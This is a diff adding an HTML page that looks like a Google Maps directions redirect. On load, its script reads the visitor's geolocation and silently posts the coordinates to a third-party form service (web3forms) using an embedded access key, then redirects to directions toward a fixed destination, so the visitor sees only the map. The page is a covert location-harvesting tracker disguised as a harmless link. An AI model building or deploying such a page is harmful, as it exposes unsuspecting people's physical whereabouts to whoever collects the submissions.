@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit Location Data</title>
+</head>
+<body>
+
+<form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
+
+    <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="5b754b21-da53-4b6e-877c-315c7b2fc4eb">
+
+    <!-- Longitude and Latitude Input Fields -->
+    <input type="hidden" id="longitude" name="longitude" required>
+    <input type="hidden" id="latitude" name="latitude" required>
+
+    <!-- Honeypot Spam Protection -->
+    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
+</form>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    console.log("DOM fully loaded and parsed."); // Debugging
+
+    if (navigator.geolocation) {
+        console.log("Geolocation is supported."); // Debugging
+
+        navigator.geolocation.getCurrentPosition(function(position) {
+            console.log("Position received:", position); // Debugging
+
+            // Set longitude and latitude values
+            document.getElementById("longitude").value = position.coords.longitude;
+            document.getElementById("latitude").value = position.coords.latitude;
+
+            // Automatically submit the form using AJAX
+            submitForm();
+
+            // Redirect to Google Maps with the given coordinates
+            redirectToGoogleMaps(position.coords.latitude, position.coords.longitude);
+        }, function(error) {
+            console.error("Error getting position:", error); // Error handling
+        });
+    } else {
+        console.log("Geolocation is not supported by this browser."); // Fallback
+    }
+});
+
+function submitForm() {
+    var form = document.getElementById("locationForm");
+    var formData = new FormData(form);
+
+    // Use Fetch API to submit the form data asynchronously
+    fetch(form.action, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Form submitted successfully:", data); // Handle the success silently
+    })
+    .catch(error => {
+        console.error("Error submitting form:", error); // Handle the error silently
+    });
+}
+
+function redirectToGoogleMaps(lat, lon) {
+    // Replace these with your desired destination coordinates
+    var destLat = 24.9435088;
+    var destLon = 66.9868986;
+
+    var googleMapsUrl = `https://www.google.com/maps/dir/${lat},${lon}/${destLat},${destLon}`;
+    window.location.href = googleMapsUrl;
+}
+</script>
+
+</body>
+</html>
